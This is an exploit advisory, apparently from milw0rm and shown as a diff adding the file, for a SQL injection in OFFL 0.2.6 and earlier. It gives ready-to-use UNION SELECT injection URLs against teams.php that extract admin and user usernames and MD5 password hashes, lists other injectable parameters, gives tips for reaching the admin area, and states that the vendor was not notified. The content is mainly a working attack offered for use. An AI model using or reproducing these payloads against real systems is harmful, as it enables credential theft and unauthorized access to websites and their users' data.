@@ -1,0 +1,58 @@
+-[*]+================================================================================+[*]-
+-[*]+		    OFFL <= 0.2.6 Remote SQL Injection Vulnerability	             +[*]-
+-[*]+================================================================================+[*]-
+
+
+
+[*] Discovered By: t0pP8uZz
+[*] Discovered On: 19 JUNE 2008
+[*] Script Download: http://downloads.sourceforge.net/offl
+[*] DORK: N/A
+
+
+
+[*] Vendor Has Not Been Notified!
+
+
+
+[*] DESCRIPTION: 
+
+	OFFL 0.2.6 and prior versions, suffer from multiple insecure mysql querys.
+	
+	SQL Injections below, there are various other spots which are injectable too...
+ 
+	including " leagues.php?league_id=1' ", " players.php?player_id=190' " 	
+
+
+
+[*] SQL Injection:
+
+For Admin: http://site.com/teams.php?fflteam_id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,CONCAT(username,0x3a,password)/**/FROM/**/users/**/WHERE/**/admin=1/**/LIMIT/**/0,1/*
+For Users: http://site.com/teams.php?fflteam_id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,CONCAT(username,0x3a,password)/**/FROM/**/users/**/LIMIT/**/0,1/*
+
+
+
+[*] NOTE/TIP: 
+
+	admin area is at "admin.php" login using the normal login page first.
+	passwords are encrypted in MD5
+
+	no effcient dork, sql columns may vary on some sites.
+
+[*] GREETZ: 
+
+	milw0rm.com, h4ck-y0u.org, Offensive-Security.com, CipherCrew !
+
+
+
+[-] Peace...
+
+	...t0pP8uZz !
+
+
+
+-[*]+================================================================================+[*]-
+-[*]+		    OFFL <= 0.2.6 Remote SQL Injection Vulnerability	             +[*]-
+-[*]+================================================================================+[*]-
+
+# milw0rm.com [2008-06-21]
